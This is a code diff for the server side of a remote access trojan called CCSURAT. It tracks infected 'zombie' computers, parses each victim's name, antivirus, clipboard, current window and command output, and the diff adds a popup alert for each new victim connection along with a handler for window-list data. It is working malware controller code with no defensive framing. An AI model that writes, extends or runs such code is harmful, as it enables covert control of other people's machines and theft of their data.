@@ -21,11 +21,13 @@ namespace CCSURAT_Server
         private ListView zombieListView;
         private ZombieListItem zombieItem;
 
+        // Network
         private TcpClient client;
         private NetworkStream netStream;
 
         #region Information
-        public string IP, clientVersion, computerName, username, OS, CPU, RAM, AV, currentWindow, clipboard, CMDData;
+        // Details about the client or client's computer
+        public string ID, IP, clientVersion, computerName, username, OS, CPU, RAM, AV, currentWindow, clipboard, CMDData, windows;
         private string status, curData;
         private Boolean active;
 
@@ -65,6 +67,8 @@ namespace CCSURAT_Server
             this.SendData("[[START]][[/START]]");
             Console.Beep();
         }
+
+        // Listen on the network stream for data coming from the client.
         public void ListenForData()
         {
             try
@@ -83,8 +87,8 @@ namespace CCSURAT_Server
                                 data = Encoding.ASCII.GetString(bytes, 0, i);
                                 curData += data;
 
-                                // Log data if it's not going to be buffered.
-                                if (FirstCommandIsClosed(curData))
+                                // Log data if not binary
+                                if (!data.Contains("[[BINARY]]") && !bufferBytes)
                                     Log("Data recieved: " + data);
 
                                 // If we are receiving binary data, place data into buffer.
@@ -191,11 +195,13 @@ namespace CCSURAT_Server
                     string command = GetCommand(data);
                     data = RemoveCommand(data);
 
+                    // Handle data based on the command.
                     switch (command)
                     {
                         case "START":
                             ParseSystemInfo(data);
                             AddToListView();
+                            NotifyNewConnection();
                             break;
                         case "STATUS":
                             status = data;
@@ -218,6 +224,9 @@ namespace CCSURAT_Server
                             break;
                         case "PING":
                             // If client-side pinging is implemented.
+                            break;
+                        case "WINDOWS":
+                            windows = data;
                             break;
                     }
                 }
@@ -283,7 +292,7 @@ namespace CCSURAT_Server
             return data.Contains(closeCommandTag);
         }
 
-        // Gets the first command in data.
+        // Gets the first command's data.
         private string FirstCommand()
         {
             string openCommandTag = curData.Substring(0, curData.IndexOf("]") + 2);
@@ -309,6 +318,7 @@ namespace CCSURAT_Server
             }
         }
 
+        // Add to main forms listview.
         private void AddToListView()
         {
             // handle cross-thread call.
@@ -320,22 +330,24 @@ namespace CCSURAT_Server
 
             // add stored client information to listview.
             zombieItem = new ZombieListItem(this);
-            zombieItem.Text = IP;
+            zombieItem.Text = ID;
+            zombieItem.SubItems.Add(IP); // subitem #1
             zombieItem.SubItems.Add(ping + " ms");
             // Will need to add a check if client version is older than server version. 
             // If that's the case, then update client or at least mark as outdated.
-            zombieItem.SubItems.Add(clientVersion); // subitem #1
+            zombieItem.SubItems.Add(clientVersion);
             zombieItem.SubItems.Add(computerName);
             zombieItem.SubItems.Add(username);
             zombieItem.SubItems.Add(OS);
             zombieItem.SubItems.Add(CPU);
             zombieItem.SubItems.Add(RAM);
             zombieItem.SubItems.Add(AV);
-            zombieItem.SubItems.Add(currentWindow); // subitem #8
+            zombieItem.SubItems.Add(currentWindow); // subitem #10
 
             zombieListView.Items.Add(zombieItem);
         }
 
+        // Update the listview active window column for this client.
         private void UpdateActiveWindow()
         {
             if (zombieListView.InvokeRequired)
@@ -344,13 +356,14 @@ namespace CCSURAT_Server
                 return;
             }
             try {
-                zombieItem.SubItems[9].Text = currentWindow;
+                zombieItem.SubItems[10].Text = currentWindow;
             } catch(Exception ex)
             {
 
             }
         }
 
+        // Update the listview ping column for this client.
         public void UpdatePing()
         {
             if (zombieListView.InvokeRequired)
@@ -361,7 +374,7 @@ namespace CCSURAT_Server
             try
             {
                 GetPing();
-                zombieItem.SubItems[1].Text = ping + " ms";
+                zombieItem.SubItems[2].Text = ping + " ms";
             }
             catch (Exception ex)
             {
@@ -369,6 +382,8 @@ namespace CCSURAT_Server
             }
         }
 
+        // Removes client from the list of active clients and sets the listview
+        // item to gray color.
         private void RemoveFromListView()
         {
             if (zombieListView.InvokeRequired)
@@ -397,16 +412,18 @@ namespace CCSURAT_Server
             // The rest of the information is what was sent by the client.
             // Each piece of system info is seperated by: |*|
             string[] info = data.Split("|*|".ToCharArray(), StringSplitOptions.RemoveEmptyEntries);
-            clientVersion = info[0];
-            computerName = info[1];
-            username = info[2];
-            OS = info[3];
-            CPU = info[4];
-            RAM = info[5];
-            AV = info[6];
-            currentWindow = info[7];
+            ID = info[0];
+            clientVersion = info[1];
+            computerName = info[2];
+            username = info[3];
+            OS = info[4];
+            CPU = info[5];
+            RAM = info[6];
+            AV = info[7];
+            currentWindow = info[8];
         }
 
+        // Parses list of monitors returned by the client.
         public void ParseMonitorInfo(string data)
         {
             try {
@@ -428,11 +445,19 @@ namespace CCSURAT_Server
             }
         }
 
+        // Create notification popup to notify of new connection.
+        private void NotifyNewConnection()
+        {
+            mainForm.taskbarIcon.BalloonTipTitle = "New Connection!";
+            mainForm.taskbarIcon.BalloonTipText = "IP: " + IP + "\nComputer: " + computerName + "\nUser: " + username;
+            mainForm.taskbarIcon.ShowBalloonTip(3000);
+        }
         public Boolean IsActive()
         {
             return active;
         }
 
+        // Print to main form's console.
         private void Log(string s)
         {
             mainForm.Log(s);
